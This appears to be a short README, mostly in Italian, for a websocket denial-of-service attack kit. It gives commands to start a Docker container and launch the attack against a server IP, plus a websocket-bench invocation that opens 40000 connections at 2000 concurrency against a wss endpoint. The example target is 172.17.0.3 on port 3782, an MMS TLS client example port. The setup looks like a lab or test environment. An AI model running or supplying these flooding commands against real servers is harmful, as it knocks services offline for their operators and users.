==== DoS Attacck for websocket =====

Inizializzazione del container docker:
./dosattack

Per eseguire l'attacco
./start [IP_SERVER]

___________________________________________________

===== Informazioni sullo script =====


LAUNCH COMMAND:
 -$ websocket-bench -a 40000 -c 2000 wss://IP:port &

example:
websocket-bench -a 40000 -c 2000 wss://172.17.0.3:3782 &

3782 is the default port for MMS tls_client_example
___________________________________________________

